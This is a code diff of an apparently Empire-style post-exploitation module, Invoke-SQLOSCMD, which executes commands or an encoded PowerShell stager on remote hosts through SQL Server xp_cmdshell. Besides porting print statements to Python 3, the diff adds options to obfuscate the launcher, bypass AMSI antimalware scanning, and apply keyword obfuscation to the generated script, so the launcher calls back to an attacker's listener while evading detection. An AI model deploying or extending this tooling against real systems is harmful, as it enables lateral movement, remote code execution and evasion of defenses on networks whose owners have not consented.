@@ -1,13 +1,21 @@
+from __future__ import print_function
+
+from builtins import object
+from builtins import str
+
 from lib.common import helpers
-class Module:
+
+
+class Module(object):
     def __init__(self, mainMenu, params=[]):
         self.info = {
             'Name': 'Invoke-SQLOSCMD',
             'Author': ['@nullbind', '@0xbadjuju'],
             'Description': ('Executes a command or stager on remote hosts using xp_cmdshell.'),
+            'Software': '',
+            'Techniques': ['T1505'],
             'Background' : True,
             'OutputExtension' : None,
-            
             'NeedsAdmin' : False,
             'OpsecSafe' : True,
             'Language' : 'powershell',
@@ -79,7 +87,7 @@ class Module:
         credID = self.options["CredID"]['Value']
         if credID != "":
             if not self.mainMenu.credentials.is_credential_valid(credID):
-                print helpers.color("[!] CredID is invalid!")
+                print(helpers.color("[!] CredID is invalid!"))
                 return ""
             (credID, credType, domainName, username, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
             if domainName != "":
@@ -89,6 +97,11 @@ class Module:
             if password != "":
                 self.options["Password"]['Value'] = password
 
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
+
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
@@ -97,6 +110,13 @@ class Module:
         command = self.options['Command']['Value']
         username = self.options['UserName']['Value']
         password = self.options['Password']['Value']
+        if (self.options['Obfuscate']['Value']).lower() == 'true':
+            Obfuscate = True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
 
 
         moduleSource = self.mainMenu.installPath + "data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1"
@@ -108,17 +128,17 @@ class Module:
             with open(moduleSource, 'r') as source:
                 moduleCode = source.read()
         except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
             return ""
         script = moduleCode
 
 
         if command == "":
             if not self.mainMenu.listeners.is_listener_valid(listenerName):
-                print helpers.color("[!] Invalid listener: " + listenerName)
+                print(helpers.color("[!] Invalid listener: " + listenerName))
                 return ""
             else:
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
                 if launcher == "":
                     return ""
                 else:
@@ -131,7 +151,10 @@ class Module:
             scriptEnd += " -UserName "+username
         if password != "":
             scriptEnd += " -Password "+password
+
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
